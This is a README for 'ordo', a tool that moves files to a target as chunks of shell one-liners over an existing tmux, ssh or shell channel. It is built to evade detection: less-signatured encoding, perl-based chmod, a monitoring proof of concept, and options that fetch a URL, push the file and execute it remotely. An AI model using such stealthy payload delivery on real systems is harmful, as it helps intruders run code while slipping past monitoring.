# ordo

Unorthodox file transfer via shell one-liners.

`ordo` converts a file into a stream of self-contained shell commands
(`printf '%s' ... | base64 -d >> /path`, `perl -e 'print pack(...)'`, …) and feeds
them into an existing channel: a tmux pane, an open ssh session, a local
shell, or just stdout for manual paste. No downloader binary, no new network
connection on the target — the channel you already have *is* the transport.

## Build

```bash
cargo build --release   # binary: ./target/release/ordo
cargo test
```

## Usage

```
ordo send <source> -t <backend> -r <remote_path> [OPTIONS]
```

Source: file path, `-`/`--stdin` for stdin, or `http(s)://` URL — fetched
locally first (via `curl`), then transferred like any file.

### Backends (`-t`)

| Backend            | How commands reach the target                     |
|--------------------|---------------------------------------------------|
| `stdout`           | print them (dry run / manual paste)               |
| `tmux:<target>`    | `tmux send-keys` into a pane (use `--delay`)      |
| `ssh:<[user@]host>`| pipe into `sh` over one existing ssh connection   |
| `exec:<cmd>`       | pipe into stdin of local `<cmd>` (e.g. `sh`)      |

### Options

```
-e, --encoding <basenc|base64|perl|printf|python>
                                             chunk encoding (default: basenc —
                                             base32 via coreutils basenc, less
                                             signatured than base64)
-c, --chunk-size <n>                         bytes per chunk (default: 1024)
    --verify                                 sha256 check after transfer
    --delay <ms>                             delay between chunks (tmux/VNC)
    --chmod [MODE]                           chmod remote file (default 755)
    --chmod-method <perl|direct>             perl builtin = no /bin/chmod
                                             execve (default); direct = plain chmod
    --exec [ARGS]                            execute remote file after
                                             transfer (implies --chmod 755)
    --no-chmod                               skip the chmod --exec implies
```

### Examples

```bash
# Inspect the one-liners without sending anything
ordo send ./tool -t stdout -r /tmp/tool

# Type into a tmux pane (slow channel — throttle it)
ordo send ./tool -t tmux:session.0 -r /tmp/tool --delay 50

# Stream over ssh and verify integrity
ordo send ./tool -t ssh:user@host -r /tmp/tool --verify

# Upload + chmod + execute in one go
ordo send ./tool -t ssh:user@host -r /tmp/tool --exec
ordo send ./tool -t exec:sh -r /tmp/tool --exec "-l 0"

# Straight from a URL: download locally, push, run on target
ordo send https://example.com/tool.sh -t ssh:user@host -r /tmp/tool --exec
```

## Observability

`observability/poc.sh` proves the stealth property with tracee: a classic
`curl` download is flagged (execve + socket connects), while an `ordo`
transfer over an existing channel produces **zero** downloader events — with
`--exec`, only the tool's own execve shows up. See
[observability/README.md](observability/README.md).
